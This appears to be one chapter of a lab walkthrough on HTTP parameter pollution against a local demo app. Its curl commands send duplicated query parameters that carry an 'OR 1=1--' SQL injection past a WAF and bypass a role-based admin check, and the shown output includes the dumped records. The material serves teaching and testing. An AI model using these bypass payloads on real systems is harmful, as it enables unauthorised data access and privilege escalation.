# 03: Finding the Bug

## Probe the application

```
$ curl -s http://127.0.0.1:8098/
{"app":"CorpSearch","endpoints":[
  "GET /api/search?id=<number>  -- search users by id (WAF protected)",
  "GET /api/admin?role=<value>  -- admin panel (role check protected)"
]}
```

## Identify the WAF

Try a standard SQLi probe on the search endpoint:

```
$ curl -s 'http://127.0.0.1:8098/api/search?id=1%20OR%201%3D1--'
{"error":"WAF: blocked suspicious input","blocked_value":"1 OR 1=1--"}
```

The WAF blocks any `id` value containing SQL keywords.

## Test for HPP behavior

Send the same `id` parameter twice: a clean value first, then the injection:

```
$ curl -s 'http://127.0.0.1:8098/api/search?id=1&id=1%20OR%201%3D1--'
{"results":[{"id":1,"name":"alice","role":"user"},{"id":2,"name":"bob","role":"user"},{"id":999,"name":"admin","role":"admin","secret":"POC{...}"}],"count":3}
```

The WAF saw `1` (the first value) and allowed the request. The backend executed against `1 OR 1=1--` (the last value) and returned all rows including the admin secret.

## Identify the access control check

Try accessing admin with `role=user`:

```
$ curl -s 'http://127.0.0.1:8098/api/admin?role=user'
{"message":"Welcome user. No admin access."}
```

Try directly with `role=admin`:

```
$ curl -s 'http://127.0.0.1:8098/api/admin?role=admin'
{"flag2":"POC{...}","panel":"Admin panel accessed via HPP"}
```

This works directly, which means the check only matters when you can't send `role=admin` directly. In a real app, middleware might enforce a maximum role based on a session, so `role=admin` via URL would be blocked. Here, the access control is on the first parameter value.

## Test HPP on the role parameter

```
$ curl -s 'http://127.0.0.1:8098/api/admin?role=user&role=admin'
{"flag2":"POC{...}","panel":"Admin panel accessed via HPP"}
```

The access middleware read `role=user` (first value, non-admin, no block). The handler read `role=admin` (last value, opens admin panel).
